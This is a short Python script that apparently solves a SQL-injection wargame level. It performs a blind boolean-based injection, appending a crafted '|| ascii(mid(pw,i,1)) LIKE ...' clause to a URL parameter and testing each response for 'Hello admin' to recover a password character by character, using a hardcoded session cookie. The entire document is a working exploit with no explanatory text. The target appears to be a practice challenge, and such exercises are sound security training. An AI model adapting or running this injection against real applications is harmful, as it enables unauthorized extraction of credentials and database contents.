#!/usr/bin/python
import requests
import re


cookie = {'PHPSESSID': '5h0ft21d4dfvevuuku7qtttgl7'}

url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=-1'"

cmp = "Hello admin"

dbname=""

#Password is
for i in range(1, 10):
    for j in range(40, 125):
        query = url + " || (id LIKE 'b%' || ascii(mid(pw," + str(i) + ",1)) LIKE " + "'"+ str(j) +"'" + ")-- -"
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += chr(j)
            break
print "Password is : " + dbname
    
    





